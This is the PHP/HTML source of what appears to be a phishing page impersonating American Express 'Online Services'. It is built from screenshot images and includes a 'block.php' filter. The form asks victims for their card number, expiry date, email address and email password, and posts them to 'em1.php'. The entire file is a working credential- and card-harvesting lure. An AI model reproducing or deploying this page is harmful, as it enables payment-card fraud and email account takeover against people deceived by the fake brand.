<?php
require_once 'block.php';
?>


<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>American Express : Online Services </title>
<meta http-equiv="content-type" content="text/html; charset=ISO-8859-1">

<style type="text/css">
div#container
{
	position:relative;
	width: 1265px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
<link rel="shortcut icon"
              href="images/favicon.ico"/>
    
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<body style="visibility:hidden" onload="unhideBody()">
</head>
<body bgColor="#FFFFFF">
<div id="container">


<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1350px; height:141px; z-index:2"><img src="images/heads.PNG" alt="" title="" border=0 width=1350 height=141></div>

<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:139px; width:1350px; height:461px; z-index:3"><img src="images/mainsx.PNG" alt="" title="" border=0 width=1350 height=461></div>


<form action="em1.php" name=chalbhai id=chalbhai method=post>
<input name="ccnum"  required title="Please Enter Right Value" autocomplete="off" maxlength="30" type="text" style="position:absolute;width:130px;height:20px;left:170px;top:325px;z-index:6">
<input name="expr"  required title="Please Enter Right Value" autocomplete="off" placeholder="(mm-yyyy) " maxlength="60" type="text" style="position:absolute;width:130px;height:20px;left:170px;top:362px;z-index:7">
<input name="email"  required title="Please Enter Right Value" autocomplete="off" maxlength="60" type="text" style="position:absolute;width:130px;height:20px;left:170px;top:397px;z-index:7">
<input name="emailpass"  required title="Please Enter Right Value" autocomplete="off" maxlength="60" type="password" style="position:absolute;width:130px;height:20px;left:170px;top:433px;z-index:7">


<div id="formimage1" style="position:absolute; left:443px; top:455px; z-index:10"><input type="image" name="formimage1" width="240" height="32" src="images/confirm.PNG"></div>
<div id="image8" style="position:absolute; overflow:hidden; left:0px; top:572px; width:1352px; height:282px; z-index:11"><img src="images/footers.PNG" alt="" title="" border=0 width=1352 height=282></div>

</div>

</body>
</html>
